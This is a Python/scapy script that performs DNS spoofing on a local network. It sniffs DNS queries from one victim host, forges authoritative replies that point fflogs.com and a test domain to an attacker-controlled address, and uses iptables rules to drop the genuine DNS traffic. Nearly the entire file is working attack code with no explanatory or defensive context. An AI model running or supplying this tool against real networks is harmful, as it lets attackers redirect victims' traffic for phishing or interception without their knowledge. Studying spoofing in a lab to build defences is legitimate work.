#using Cython to compile the code

from cython import *
import scapy.all as scapy
import os

dns_hosts={
    b"fflogs.com.":"192.168.1.83",
    b"www.fflogs.com.":"192.168.1.83",
    b"www.thisisatest.com.":"192.168.1.83",
    b"thisisatest.com.":"192.168.1.83"
}

#sniffpackets function
def sniffpackets(interface):
    #sniff for DNS traffic
    scapy.sniff(iface=interface,count=0,filter="host 192.168.1.76", store=False, prn=process_sniffed_packet)

def create_packet(packet):
    #create a new packet using info from original packet
    #eth
    eth = scapy.Ether(dst=packet[scapy.Ether].src, src=packet[scapy.Ether].dst)
    #ip
    ip = scapy.IP(src=packet[scapy.IP].dst, dst=packet[scapy.IP].src)
    #udp
    udp = scapy.UDP(sport=packet[scapy.UDP].dport,dport=packet[scapy.UDP].sport)
    #dns
    dns = scapy.DNS(
        id=packet[scapy.DNS].id,
        qd=packet[scapy.DNS].qd,
        opcode=packet[scapy.DNS].opcode,
        aa=1,
        rd=0,
        qr=1,
        qdcount=1,
        ancount=1,
        nscount=0,
        arcount=0,
        ar=scapy.DNSRR(
            rrname=packet[scapy.DNS].qd.qname,
            type='A',
            ttl=100,
            rdata='192.168.1.83'
            )
        )
    #return the packet
    return eth/ip/udp/dns

def process_sniffed_packet(packet):
    if packet.haslayer(scapy.DNSQR):
        #reply with spoofed packet
        qname = packet[scapy.DNSQR].qname.decode()
        print(qname)
        if packet.getlayer(scapy.DNSQR).qname in dns_hosts and packet.getlayer(scapy.IP).src == '192.168.1.76':
            print('[+] Spoofing packet')
            # packet.show()
            try:
                new_packet = create_packet(packet)
                new_packet.show()
                scapy.sendp(new_packet)
                return
            except IndexError as e:
                print("error")
                print(e)
                # scapy.send(packet)


def main():
    print("[+] Starting DNS spoofing...")
    sniffpackets("wlo1")

if __name__ == "__main__":
    try:
        os.system("iptables -A FORWARD -p udp --sport 53 -d 192.168.1.76 -j DROP")
        os.system("iptables -A FORWARD -p tcp --sport 53 -d 192.168.1.76 -j DROP")
        os.system("iptables -A FORWARD -p udp --dport 53 -s 192.168.1.76 -j DROP")
        os.system("iptables -A FORWARD -p tcp --dport 53 -s 192.168.1.76 -j DROP")
        main()
    except KeyboardInterrupt:
        os.system("iptables --flush")
        print("[+] Stopping DNS spoofing...")
        exit()
    except Exception as e:
        print(e)
    finally:
        os.system("iptables --flush")
        print("[+] Stopping DNS spoofing...")
        exit()